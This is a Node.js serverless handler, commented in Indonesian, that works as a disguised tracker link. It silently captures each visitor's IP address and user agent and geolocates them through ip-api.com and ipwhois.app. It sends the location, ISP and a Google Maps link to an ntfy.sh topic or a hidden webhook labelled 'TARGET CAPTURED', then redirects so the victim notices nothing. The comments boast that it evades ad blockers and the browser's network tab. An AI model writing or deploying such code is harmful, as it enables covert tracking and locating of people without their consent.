const axios = require('axios');

module.exports = async (req, res) => {
    const { topic, t, w } = req.query;

    // Decode Target Redirect URL
    let targetUrl = 'https://google.com';
    if (t) {
        try { targetUrl = Buffer.from(t, 'base64').toString('utf-8'); } catch (e) { }
    }

    if (!topic && !w) {
        return res.redirect(301, targetUrl);
    }

    // 1. SILENT SERVER-SIDE IP CAPTURE (Gak bisa di-block AdBlock/Brave + Gak butuh izin)
    const ipRaw = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket.remoteAddress || '';
    const cleanIp = ipRaw.split(',')[0].trim();
    const userAgent = req.headers['user-agent'] || 'Unknown';

    let geo = {};
    if (cleanIp) {
        try {
            // Gunakan HTTPS Server-Side GeoIP Lookup
            const geoReq = await axios.get(`http://ip-api.com/json/${cleanIp}`);
            geo = geoReq.data;
        } catch (e) {
            // fallback api
            try {
                const geoFallback = await axios.get(`https://ipwhois.app/json/${cleanIp}`);
                const g = geoFallback.data;
                geo = {
                    query: g.ip, country: g.country, regionName: g.region, city: g.city,
                    isp: g.isp, lat: g.latitude, lon: g.longitude
                };
            } catch (err) { }
        }
    }

    const payload = {
        ip: geo.query || cleanIp || 'Unknown',
        country: geo.country || 'Unknown',
        region: geo.regionName || 'Unknown',
        city: geo.city || 'Unknown',
        isp: geo.isp || geo.org || 'Unknown',
        lat: geo.lat || null,
        lon: geo.lon || null,
        ua: userAgent,
        time: new Date().toISOString()
    };

    // 2. SERVER-TO-SERVER PUSH (Siluman, ga keliatan di Network Tab target)
    try {
        if (topic) {
            await axios.post(`https://ntfy.sh/${topic}`, JSON.stringify(payload), {
                headers: { 'Title': 'Target Tertangkap!', 'Tags': 'skull' }
            });
        }

        if (w) {
            const webhookUrl = Buffer.from(w, 'base64').toString('utf-8');
            await axios.post(webhookUrl, {
                content: `🚨 **TARGET CAPTURED** 🚨\n**IP**: ${payload.ip}\n**GEO**: ${payload.city}, ${payload.region}\n**ISP**: ${payload.isp}\n**Maps**: https://www.google.com/maps?q=${payload.lat},${payload.lon}\n\`\`\`${payload.ua}\`\`\``
            });
        }
    } catch (err) {
        // silent fail
    }

    // 3. AUTO REDIRECT INSTANT (User gak nyadar)
    return res.redirect(301, targetUrl);
};
